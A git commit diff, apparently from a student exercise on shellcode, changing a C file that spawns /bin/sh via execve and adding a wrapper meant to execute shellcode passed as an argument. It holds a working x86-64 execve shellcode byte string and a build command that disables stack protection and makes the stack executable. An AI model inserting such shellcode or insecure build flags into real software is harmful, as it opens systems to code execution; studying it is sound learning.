5c60605c7a33ed5c55632d0535dbee9cb5083eaf
ClementB-etu <belleil.clement00@gmail.com>
2023-01-11 15:17:15 +0100

    commit (shellcode01.c OK)

--- shellcodes/shellcode01.c
+++ shellcodes/shellcode01.c
@@ -1,14 +1,18 @@
 //COMPILATION : gcc -fno-stack-protector -z execstack shellcode01.c -o shellcode01
 
 #include <stdio.h>
+#include <unistd.h> 
+#include <stdlib.h>
 
-unsigned char shellcode[] = \
-"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";
+void main() {
+    char *name[2];
 
-int main()
-{
-    int (*ret)() = (int(*)())shellcode;
-    ret();
-    return 0;
+    name[0] = "/bin/sh";
+    name[1] = NULL;
+    execve(name[0], name, NULL);
+    exit(0);
 }
-    
+
+/*      Shellcode obtenu (pour tester le wrapper) avec un programme similaire à celui ci (développé en asm donc beaucoup moins volumineux) :
+        \x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
+*/
---
+++ wrapper/wrapper.c
@@ -0,0 +1,13 @@
+#include <stdio.h>
+
+int main( int argc, char *argv[], char *envp[] )
+{
+    if ( (argc < 2) ) {
+        printf("Compiler avec 1 argument");
+    } else {
+        //int (*ret)() = (int(*)())argv[1];
+        //ret();
+        //return 0;
+    }
+
+}
